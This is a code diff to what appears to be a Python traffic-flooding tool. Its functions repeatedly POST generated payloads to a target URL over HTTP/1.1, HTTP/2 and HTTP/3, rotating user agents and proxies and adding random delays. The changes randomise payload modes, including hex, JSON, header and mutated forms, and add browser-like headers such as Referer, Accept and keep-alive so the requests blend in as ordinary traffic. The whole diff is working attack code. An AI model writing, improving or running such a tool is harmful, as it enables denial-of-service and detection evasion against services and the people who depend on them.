@@ -526,7 +526,7 @@ def send_packet(ip, port, ui, delay_min, delay_max, proxies=None, target_url=Non
         try:
             ua = random.choice(user_agents)
             start = time.time()
-            payload, send_size, mode = adaptive_payload_q(ua, last_status)
+            payload, send_size, mode = generate_payload(mode=random.choice(["hex","json","header","mutate","mixed","plain"]), ua=ua)
 
             proxy = None
             if proxies:
@@ -535,11 +535,20 @@ def send_packet(ip, port, ui, delay_min, delay_max, proxies=None, target_url=Non
 
             if target_url:  # HTTP/1.1
                 try:
-                    r = requests.post(target_url,
-                                      headers={"User-Agent": ua},
-                                      data=payload,
-                                      proxies={"http": proxy, "https": proxy} if proxy else None,
-                                      timeout=3)
+                    r = requests.post(
+                        target_url,
+                        headers={
+                            "User-Agent": ua,
+                            "Accept": "*/*",
+                            "Content-Type": "application/x-www-form-urlencoded",
+                            "Connection": "keep-alive",
+                            "Accept-Encoding": "gzip, deflate",
+                            "Referer": target_url
+                        },
+                        data=payload,
+                        proxies={"http": proxy, "https": proxy} if proxy else None,
+                        timeout=3
+                    )
                     latency = time.time() - start
                     last_status = r.status_code
                     adaptive_payload_q(ua, last_status, latency, proxy=proxy, response_text=r.text)
@@ -581,7 +590,7 @@ def send_packet(ip, port, ui, delay_min, delay_max, proxies=None, target_url=Non
 
         except Exception as e:
             ui.tick_fail(str(e))
-
+            
         time.sleep(random.uniform(delay_min, delay_max))
 
 # === HTTP/2 mode (aiohttp) ===
@@ -596,7 +605,7 @@ async def send_packet_async(ip, port, ui, delay_min, delay_max, proxies=None, ta
             try:
                 ua = random.choice(user_agents)
                 start = time.time()
-                payload, send_size, mode = adaptive_payload_q(ua, last_status)
+                payload, send_size, mode = generate_payload(mode=random.choice(["hex","json","header","mutate","mixed","plain"]), ua=ua)
 
                 proxy = None
                 if proxies:
@@ -604,11 +613,20 @@ async def send_packet_async(ip, port, ui, delay_min, delay_max, proxies=None, ta
                     proxy_index = (proxy_index + 1) % len(proxies)
 
                 try:
-                    async with session.post(target_url,
-                                            headers={"User-Agent": ua},
-                                            data=payload,
-                                            proxy=proxy if proxy else None) as resp:
-                        body = await resp.text()
+                    async with session.post(
+                        target_url,
+                        headers={
+                            "User-Agent": ua,
+                            "Accept": "*/*",
+                            "Content-Type": "application/x-www-form-urlencoded",
+                            "Connection": "keep-alive",
+                            "Accept-Encoding": "gzip, deflate",
+                            "Referer": target_url
+                        },
+                        data=payload,
+                        proxy=proxy if proxy else None
+                    ) as resp:
+                        body = await resp.read()  # bytes
                         latency = time.time() - start
                         last_status = resp.status
                         adaptive_payload_q(ua, last_status, latency, proxy=proxy, response_text=body)
@@ -638,7 +656,7 @@ async def send_packet_http3(ip, port, ui, delay_min, delay_max, target_url=None)
         try:
             ua = random.choice(user_agents)
             start = time.time()
-            payload, send_size, mode = adaptive_payload_q(ua, last_status)
+            payload, send_size, mode = generate_payload(mode=random.choice(["hex","json","header","mutate","mixed","plain"]), ua=ua)
             color = mode_colors.get(mode, "white")
 
             config = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
@@ -652,7 +670,11 @@ async def send_packet_http3(ip, port, ui, delay_min, delay_max, target_url=None)
                     (b":authority", ip.encode()),
                     (b":path", b"/"),
                     (b"user-agent", ua.encode()),
-                    (b"x-mode", mode.encode())
+                    (b"x-mode", mode.encode()),
+                    (b"accept", b"*/*"),
+                    (b"content-type", b"application/x-www-form-urlencoded"),
+                    (b"connection", b"keep-alive"),
+                    (b"accept-encoding", b"gzip, deflate"),
                 ]
 
                 h3.send_headers(stream_id, headers)
